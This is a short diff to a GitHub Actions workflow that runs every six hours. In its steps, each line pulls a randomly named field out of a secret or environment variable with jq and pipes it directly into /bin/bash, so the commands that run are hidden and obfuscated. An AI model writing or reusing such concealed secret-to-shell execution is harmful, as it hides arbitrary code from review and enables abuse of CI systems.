@@ -1,21 +1,22 @@
 name: zhongxiaozxs
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 4/6 * * *'
+    - cron: '44 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhongxiaozxs
         env:
-          en90: ${{ secrets.en90 }}
+          pmhvj1932: ${{ secrets.pmhvj1932 }}
         run: |
-          echo $en90 | jq -r .knkyo62764 | /bin/bash
-          echo $cpy532 | jq -r .v38 | /bin/bash
-          echo $bfw318 | jq -r .ltbu32435 | /bin/bash
-          echo $rlk27486 | jq -r .zm059 | /bin/bash
+          echo $pmhvj1932 | jq -r .dwp35824 | /bin/bash
+          echo $njxyw995 | jq -r .sti545 | /bin/bash
+          echo $r445 | jq -r .h94 | /bin/bash
+          echo $pse5908 | jq -r .h939 | /bin/bash
+          echo $eatq1 | jq -r .oelvn33760 | /bin/bash
 
